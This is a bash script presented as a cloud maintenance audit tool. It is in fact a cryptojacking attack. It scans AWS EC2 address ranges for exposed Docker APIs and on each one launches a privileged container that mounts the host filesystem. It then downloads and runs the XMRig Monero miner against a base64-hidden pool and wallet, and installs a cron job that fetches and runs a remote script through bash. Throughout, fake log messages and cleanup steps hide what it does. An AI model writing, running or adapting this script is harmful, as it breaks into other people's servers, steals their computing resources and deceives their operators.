#!/bin/bash
# --- Disguised as a cloud maintenance tool ---
set -e

# --- Obfuscated Configuration ---
CLOUD_API_KEY="$(echo "NDN5TDd6VlV2RFBqZkJ1RVp6b0xjUFR1dkY1QnY5V1BKNWRHd3RiYkhBcHdTd25FVGtndmVkMkRa
bVhlaTZCamh5NXZaM21qblpiaFZidEhrSE1ia3k3ZFZNdVZ0U3IK=" | base64 -d)"  # Logs show "API_KEY"
TELEMETRY_ENDPOINT="$(echo "Z3VsZi5tb25lcm9vY2Vhbi5zdHJlYW06MTAxMjgK=" | base64 -d)"  # Logs show "METRICS_SERVER"

# --- Legitimate-looking cloud audit ---
echo "[INFO] Starting node health evaluation..." | tee -a /var/log/cloud_audit.log
sleep $((RANDOM % 5 + 1))  # Random delay to mimic human operator

# --- Stealthy masscan (disguised as security scan) ---
echo "[INFO] Scanning for outdated container services..." | tee -a /var/log/cloud_audit.log
curl -s https://ip-ranges.amazonaws.com/ip-ranges.json | jq -r '.prefixes[] | select(.service=="EC2") | .ip_prefix' > /tmp/.cloud_nodes.tmp
masscan -p2375,2376 -iL /tmp/.cloud_nodes.tmp --rate=300 -oG /tmp/.scan_results.tmp 2>&1 | grep -v "Discovered open port" >> /var/log/cloud_audit.log

# --- Exploitation module (disguised as patch deployment) ---
while read -r NODE_IP; do
  if timeout 3 curl -s "http://$NODE_IP:2375/version" | grep -q "ApiVersion"; then
    echo "[INFO] Applying stability patches to $NODE_IP" | tee -a /var/log/cloud_audit.log
    
    docker -H "$NODE_IP:2375" run -d --rm --privileged -v /:/mnt alpine sh -c "
      # --- Disguised as system update ---
      echo '[INFO] Installing kernel optimizations...' >> /mnt/var/log/cloud_init.log
      wget -q https://github.com/MoneroOcean/xmrig/releases/download/v6.24.0-mo1/xmrig-v6.24.0-mo1-lin64-compat.tar.gz -O /tmp/.sysupdate.tar.gz
      tar -xzf /tmp/.sysupdate.tar.gz -C /tmp/
      
      # --- Dynamic config generation ---
      echo '{
        \"autosave\": true,
        \"cpu\": true,
        \"opencl\": false,
        \"cuda\": false,
        \"pools\": [{
          \"url\": \"$TELEMETRY_ENDPOINT\",
          \"user\": \"$CLOUD_API_KEY.worker-$((RANDOM % 1000))\",
          \"pass\": \"x\",
          \"keepalive\": true
        }]
      }' > /tmp/.sysconf.json
      
      # --- Throttled execution ---
      /tmp/xmrig-v6.24.0-mo1/xmrig -c /tmp/.sysconf.json \
        --max-cpu-usage=60 \
        --background \
        --syslog >> /mnt/var/log/cloud_init.log 2>&1
      
      # --- Persistence (disguised as log rotation) ---
      echo '*/45 * * * * curl -s https://github.com/cloud-ops-dev/raw/main/resource_monitor.sh | bash' >> /mnt/etc/cron.d/cloud_maintenance
    "
  fi
done < <(grep -oP 'Host: \K[0-9.]+' /tmp/.scan_results.tmp)

# --- Cleanup ---
rm -f /tmp/.cloud_nodes.tmp /tmp/.scan_results.tmp
echo "[SUCCESS] Node health audit completed" | tee -a /var/log/cloud_audit.log
